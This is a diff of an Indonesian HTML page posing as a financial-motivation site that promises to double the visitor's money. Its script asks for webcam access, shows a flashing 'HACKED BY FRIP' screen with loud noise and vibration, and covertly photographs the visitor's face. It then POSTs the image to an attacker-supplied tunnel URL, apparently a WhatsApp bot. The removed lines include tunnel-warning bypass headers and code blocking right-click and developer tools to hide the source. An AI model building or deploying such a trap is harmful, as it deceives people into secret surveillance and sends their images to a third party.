@@ -1,555 +1,246 @@
 <!DOCTYPE html>
-
 <html lang="id">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Tips Keuangan & Investasi 2026</title>
-
     <style>
-
         /* Tampilan halaman awal (Motivasi Keuangan) */
-
         body {
-
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-
             margin: 0;
-
             padding: 0;
-
             background-color: #f0f2f5;
-
             color: #333;
-
             display: flex;
-
             justify-content: center;
-
             align-items: center;
-
             height: 100vh;
-
             overflow: hidden;
-
         }
-
-
 
         .container {
-
             text-align: center;
-
             background: white;
-
             padding: 40px;
-
             border-radius: 10px;
-
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-
             max-width: 600px;
-
             z-index: 1;
-
         }
-
-
 
         h1 {
-
             color: #2c3e50;
-
             font-size: 26px;
-
             margin-bottom: 20px;
-
         }
-
-
 
         p {
-
             font-size: 16px;
-
             color: #555;
-
             margin-bottom: 30px;
-
             line-height: 1.6;
-
         }
-
-
 
         button {
-
             background-color: #27ae60;
-
             color: white;
-
             border: none;
-
             padding: 15px 30px;
-
             font-size: 16px;
-
             border-radius: 5px;
-
             cursor: pointer;
-
             transition: background 0.3s;
-
             font-weight: bold;
-
             width: 100%;
-
         }
-
-
 
         button:hover {
-
             background-color: #219150;
-
         }
-
-
 
         /* --- TAMPILAN PRANK HACKED --- */
-
         #prank-screen {
-
             display: none; 
-
             position: fixed;
-
             top: 0;
-
             left: 0;
-
             width: 100vw;
-
             height: 100vh;
-
             z-index: 9999;
-
             flex-direction: column;
-
             justify-content: center;
-
             align-items: center;
-
         }
-
-
 
         .hacked-text {
-
             font-family: 'Courier New', Courier, monospace;
-
             font-size: 4rem;
-
             font-weight: bold;
-
             text-align: center;
-
             margin: 0;
-
             padding: 20px;
-
         }
-
-
 
         /* Styling untuk foto hasil jepretan */
-
         #captured-photo {
-
             display: none;
-
             margin-top: 20px;
-
             width: 80%;
-
             max-width: 350px;
-
             border: 5px solid red;
-
             border-radius: 10px;
-
             box-shadow: 0 0 30px red;
-
         }
-
-
 
         /* Animasi Berkedip Hitam Putih */
-
         @keyframes flash {
-
             0% { background-color: black; color: white; }
-
             50% { background-color: white; color: red; }
-
             100% { background-color: black; color: white; }
-
         }
-
-
 
         /* Animasi Gemetar (Shake) */
-
         @keyframes shake {
-
             0% { transform: translate(2px, 1px) rotate(0deg); }
-
             10% { transform: translate(-1px, -2px) rotate(-2deg); }
-
             20% { transform: translate(-3px, 0px) rotate(2deg); }
-
             30% { transform: translate(0px, 2px) rotate(0deg); }
-
             40% { transform: translate(1px, -1px) rotate(2deg); }
-
             50% { transform: translate(-1px, 2px) rotate(-1deg); }
-
             60% { transform: translate(-3px, 1px) rotate(0deg); }
-
             70% { transform: translate(2px, 1px) rotate(-2deg); }
-
             80% { transform: translate(-1px, -1px) rotate(2deg); }
-
             90% { transform: translate(2px, 2px) rotate(0deg); }
-
             100% { transform: translate(1px, -2px) rotate(-1deg); }
-
         }
-
-
 
         /* Class untuk mengaktifkan prank */
-
         .active-prank {
-
             display: flex !important;
-
             animation: flash 0.08s infinite, shake 0.1s infinite;
-
         }
-
     </style>
-
 </head>
-
 <body>
 
-
-
     <!-- Layar Utama Motivasi -->
-
     <div class="container" id="main-content">
-
         <h1>Rahasia Kebebasan Finansial</h1>
-
         <p>"Jangan bekerja untuk uang, pelajari caranya agar uang yang bekerja keras untuk Anda. Kami akan membimbing Anda menggandakan aset dalam 30 hari."</p>
-
         <button id="prank-btn">mau mempelajari lebih lanjut? klik disini</button>
-
     </div>
-
-
 
     <!-- Layar Prank (Hacked) -->
-
     <div id="prank-screen">
-
         <h1 class="hacked-text">HACKED BY FRIP</h1>
-
         <!-- Gambar untuk menampilkan wajah korban -->
-
         <img id="captured-photo" alt="Face Captured" />
-
     </div>
 
-
-
     <!-- Elemen Kamera Tersembunyi (Spy Cam) -->
-
     <video id="webcam" autoplay playsinline style="display:none;"></video>
-
     <canvas id="canvas" style="display:none;"></canvas>
 
-
-
     <script>
-
         // 1. TANGKAP DATA API DARI URL BOT (.iplogger)
-
         const urlParams = new URLSearchParams(window.location.search);
-
         const apiTarget = urlParams.get('api') || ''; // Ini dapet dari Localtunnel Bot lu
-
         const TRAP_ID = urlParams.get('id') || 'VERCEL_TRAP'; // ID unik korban
 
-
-
         const btn = document.getElementById('prank-btn');
-
         const prankScreen = document.getElementById('prank-screen');
-
         const mainContent = document.getElementById('main-content');
-
         
-
         const video = document.getElementById('webcam');
-
         const canvas = document.getElementById('canvas');
-
         const photo = document.getElementById('captured-photo');
 
-
-
         // Fungsi Suara Rusak/Bising
-
         function playAnnoyingSound() {
-
             try {
-
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-
                 const oscillator = audioCtx.createOscillator();
-
                 const gainNode = audioCtx.createGain();
 
-
-
                 oscillator.type = 'sawtooth';
-
                 oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
-
                 
-
                 setInterval(() => {
-
                     const freq = oscillator.frequency.value === 800 ? 1200 : 800;
-
                     oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
-
                 }, 100);
 
-
-
                 gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
-
                 oscillator.connect(gainNode);
-
                 gainNode.connect(audioCtx.destination);
-
                 oscillator.start();
-
             } catch(e) {}
-
         }
 
-
-
-        // Fungsi Jepret & Kirim ke Bot (YANG SUDAH DIPERBAIKI)
-
+        // Fungsi Jepret & Kirim ke Bot
         function takePhotoAndSend() {
-
             try {
-
                 canvas.width = video.videoWidth;
-
                 canvas.height = video.videoHeight;
-
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
                 
-
-                // Ubah jadi base64 image
-
+                // Ubah jadi base64 image (kualitas dikurangi biar ringan dikirim)
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-
                 photo.src = dataUrl;
+                photo.style.display = 'block'; // Munculkan foto korban di layar
 
-                photo.style.display = 'block';
-
-
-
+                // Matikan kamera setelah difoto
                 const stream = video.srcObject;
-
                 if (stream) { stream.getTracks().forEach(track => track.stop()); }
 
-
-
-                // PENGIRIMAN RAHASIA KE BOT WHATSAPP DENGAN TIKET BYPASS
-
+                // PENGIRIMAN RAHASIA KE BOT WHATSAPP
                 if (apiTarget) {
-
                     fetch(apiTarget + '/api/trap/photo', {
-
                         method: 'POST',
-
-                        headers: { 
-
-                            'Content-Type': 'application/json',
-
-                            // INI KUNCI RAHASIANYA BIAR GAK DIBLOCK LOCALTUNNEL / NGROK
-
-                            'Bypass-Tunnel-Reminder': 'true',
-
-                            'ngrok-skip-browser-warning': 'true'
-
-                        },
-
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ id: TRAP_ID, photoBase64: dataUrl })
-
-                    })
-
-                    .then(response => console.log("Laporan terkirim! Status:", response.status))
-
-                    .catch(err => console.log("Gagal lapor ke markas:", err));
-
+                    }).catch(err => console.log("Gagal lapor ke markas"));
                 }
-
             } catch(e) {}
-
         }
 
         // Mulai Prank
-
         function startPrank() {
-
             // Fullscreen
-
             const elem = document.documentElement;
-
             if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
-
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen().catch(()=>{});
 
-
-
             // Ganti Layar
-
             mainContent.style.display = 'none';
-
             prankScreen.classList.add('active-prank');
 
-
-
             // Serangan Audio
-
             playAnnoyingSound();
-
             if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 5000]); }
 
-
-
             // Jepret foto setelah 1 detik
-
             setTimeout(takePhotoAndSend, 1000);
-
         }
 
-
-
         // Tombol Diklik
-
         btn.addEventListener('click', async () => {
-
             btn.innerText = "MEMUAT MATERI...";
-
             btn.style.backgroundColor = "#ff9800";
-
             
-
             try {
-
                 // Minta izin kamera
-
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-
                 video.srcObject = stream;
-
                 
-
                 // Tunggu kamera fokus, baru ledakkan prank
-
                 setTimeout(startPrank, 600);
-
             } catch (err) {
-
                 // Kalau korban menolak izin kamera (Block), prank tetap jalan untuk ngagetin!
-
                 startPrank();
-
             }
-
         });
-
-        // ==========================================
-
-        // 🛡️ SISTEM ANTI-INSPECT & ANTI-KLIK KANAN 🛡️
-
-        // ==========================================
-
-        
-
-        // 1. Matiin Klik Kanan (Context Menu)
-
-        document.addEventListener('contextmenu', event => event.preventDefault());
-
-
-
-        // 2. Matiin Shortcut Keyboard Hacker (F12, Ctrl+Shift+I, Ctrl+U, dll)
-
-        document.onkeydown = function (e) {
-
-            // F12
-
-            if (e.keyCode == 123) {
-
-                return false;
-
-            }
-
-            // Ctrl+Shift+I (Inspect)
-
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
-
-                return false;
-
-            }
-
-            // Ctrl+Shift+J (Console)
-
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
-
-                return false;
-
-            }
-
-            // Ctrl+U (View Source)
-
-            if (e.ctrlKey && e.keyCode == 85) {
-
-                return false;
-
-            }
-
-        };
-
-        // ==========================================
-
     </script>
-
 </body>
-
 </html>
